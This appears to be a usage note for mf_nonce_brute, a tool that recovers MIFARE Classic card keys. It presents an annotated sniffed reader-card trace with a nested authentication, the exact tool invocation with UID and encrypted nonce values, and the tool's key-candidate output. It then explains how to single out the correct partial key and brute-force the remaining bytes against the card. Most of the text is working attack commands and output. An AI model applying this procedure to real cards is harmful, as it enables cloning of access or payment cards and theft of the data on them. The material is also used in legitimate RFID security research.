Sample trace:

    93 70 fd ac f6 d8 7f 21 4f  			  // select card with UID fdacf6d8
TAG 08 b6 dd 						  // sak        
    60 04 d1 3d 					  // wanna auth block 0x04 with A key
TAG ed 12 9c 74 				   	  // 1st auth clear text nt
    55 53 9f cc 41 8d e8 f3 			    	  // nr', ar'  (nr^ks1, ar^ks2 )
TAG 05 49 e1 65 					  // at' ( at^ks3 )
    03 24 26 56						  // wanna read block 0x04
TAG ac 69 ef 58 45 e1 c2 1d a9 47 a5 94 54 ef 5d c7 1e a9 // block 0x04 content
    d4 3e a8 aa 
TAG 8e 8e e3 e6 e9 e2 5f dd f6 08 ce fb 02 6a db 75 94 2f 
    79 77 68 3c 
TAG e0 00 00 80 80 08 cc 80 08 9c 82 e0 68 64 60 30 91 60  // 18 bytes = 16 byte content + 2 bytes crc
    ea 88 c3 c2 					   // 4 byte read cmd	
TAG a3 76 dc df c1 42 e0 ee c6 75 a4 ca eb 0c da eb 46 a0  // 18 bytes = 16 byte content + 2 bytes crc ks8 + crc
    2d 27 ab 6f 					   // wanna auth to 0x04 block with key B

-------Until this line we can recover key or decrypt communication with no troubles (see mfkey64 tool)--------------------------------

TAG 52 6e af 8b						   // nested auth encrypted tag nonce that we dont know 
    8e 21 3a 29 a4 80 7e 02				   // nr_enc = nr^ks1, ar_enc = ar^ks2	
TAG b9 43 74 8d						   // at_enc = at^ks3 
    e2 25 f8 32						   // probably next command (actually is read block cmd, but we dont know it yet)	 
TAG 1f 26 82 8d 12 21 dd 42 c2 84 3e d0 26 7f 6b 2a 81 a9  // probably data
    ba 85 1d 36 					   // probably read cmd
TAG 62 a8 78 69 ee 36 22 16 1c ff 4b 4e 69 cb 27 c2 e8 7e  // probably data
    a7 b1 c8 da 					   // probably read cmd
TAG b2 fc 6c 65 60 ec 35 83 87 56 e3 7e 3c bf 38 b8 73 21  // probably data 
    99 92 13 55 					   // probably read cmd
TAG 93 5b 65 a3 1d 8c 75 b8 3a 63 e2 31 f0 d0 a9 24 9a f6  // probably data 


./mf_nonce_brute fdacf6d8 8e213a29 a4807e02 b943748d e225f832
                 ^--UID   ^-nr_enc ^-ar_enc ^-at_enc ^-encrypted next cmd

After all we get some key last bytes candidates:

**** Key candidate found ****
thread #0
current nt:00001bf4
current ar_enc:a4807e02
current at_enc:b943748d
ks2:c1867dbd
ks3:62b99451
ks4:c42c9063
enc cmd:	e225f832
decrypted cmd:	26096851	<--- Look here! it is not kook like a valid command

Key candidate: [45e3ddbb2255]

Checked 49.19 % 	32236
**** Key candidate found ****
thread #0
current nt:00007e64
current ar_enc:a4807e02
current at_enc:b943748d
ks2:509e1e18
ks3:de441da3
ks4:d221dedc
enc cmd:	e225f832
decrypted cmd:	300426ee	<--- But this one looks definetely like read request rfom 0x04 block

Key candidate: [ab09ffffffff]   <--- So here we got a last 4 bytes of key. First 2 bytes should be bruteforced in phase 2 with mf_key_brute tool that interacts with a card.





